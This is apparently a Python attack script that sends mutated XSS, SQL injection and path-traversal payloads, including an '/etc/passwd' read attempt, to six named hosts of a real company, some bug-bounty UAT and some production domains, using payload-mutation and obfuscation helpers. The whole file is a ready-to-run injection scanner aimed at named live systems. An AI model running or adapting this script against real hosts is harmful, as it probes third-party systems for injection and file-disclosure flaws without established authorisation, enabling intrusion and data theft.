import requests
from shadow_payload_lab import generate_mutated_payload, obfuscate_payload
from shadow_vector_engine import get_vectors

targets = [
    "https://uat-bugbounty.nonprod.syfe.com",
    "https://api-uat-bugbounty.nonprod.syfe.com",
    "https://www.syfe.com",
    "https://api.syfe.com",
    "https://alfred.syfe.com",
    "https://mark8.syfe.com"
]

payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>",
    "' OR '1'='1",
    "../../../etc/passwd"
]

for target in targets:
    print(f"[*] Testing {target}")
    for vector in get_vectors():
        for raw in payloads:
            mutated = generate_mutated_payload(raw)
            url = f"{target}{vector.replace('{payload}', mutated)}"
            try:
                r = requests.get(url, timeout=5)
                print(f"[{r.status_code}] {url}")
            except Exception as e:
                print(f"[ERR] {url} :: {e}")
